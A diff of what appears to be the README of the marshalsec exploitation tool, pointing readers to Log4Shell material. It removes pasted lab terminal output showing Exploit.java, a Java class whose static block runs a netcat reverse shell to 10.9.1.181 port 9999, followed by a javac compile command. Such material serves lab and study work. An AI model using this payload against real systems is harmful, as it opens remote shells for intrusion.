@@ -4,19 +4,6 @@ If you came here for Log4Shell/CVE-2021-44228, you may want to read about
 the exploitation vectors and affected Java runtime versions:
 <https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/>
 
-┌──(kali㉿kali)-[~/thm/solar/marshalsec]
-└─$ cat Exploit.java
-public class Exploit {
-    static {
-        try {
-            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.9.1.181 9999");
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-}
-
-
 (kali㉿kali)-[~/thm/solar/marshalsec]
 $ javac Exploit.java -source 8 -target 8
 
